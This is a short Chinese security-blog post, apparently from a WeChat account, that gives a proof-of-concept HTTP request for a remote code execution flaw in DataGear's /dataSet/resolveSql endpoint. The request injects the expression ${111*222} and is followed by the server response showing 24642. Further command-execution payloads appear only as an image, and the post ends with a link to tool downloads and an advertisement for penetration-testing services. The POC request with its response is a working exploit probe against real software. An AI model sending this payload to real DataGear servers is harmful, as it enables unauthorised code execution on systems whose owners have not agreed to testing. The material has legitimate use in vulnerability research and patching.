#  DataGear resolveSql 远程代码执行漏洞   
原创 黑熊先生  黑熊安全   2024-11-12 16:57  
  
亲爱的读者，我们诚挚地提醒您，黑熊安全公众号的技术文章仅供个人研究学习参考。任何因传播或利用本实验室提供的信息而造成的直接或间接后果及损失，均由使用者自行承担责任。黑熊安全团队及作者对此概不负责。如有侵权，请立即告知，我们将立即删除并致歉。感谢您的理解与支持！  
  
POC  
```
POST /dataSet/resolveSql HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: application/json
Content-Length: 27

{"sql": "${111*222}"}
```  
  
运行该poc数据包会返回如下内容  
  
计算出111*222的结果  
```
HTTP/1.1 200 
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
Content-Type: text/html;charset=UTF-8
Content-Length: 11
Keep-Alive: timeout=60
Connection: keep-alive

24642
```  
  
其他命令执行POC  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/kmmKLfv0wV9updpNdypvsWFu715tNHVo8lbvslwAbopXQofK4sIBviaGtqYIQcvWmJZHg3aXygolc4lzpVWicM5w/640?wx_fmt=png&from=appmsg "")  
  
已发布文章所有下载工具连接：https://pan.quark.cn/s/0c1cbe67aec4  
  
承接SRC众测、网站众测、红蓝攻防、代码审计、培训、公众号广告等业务。微信：xxbearyyds  
  
  
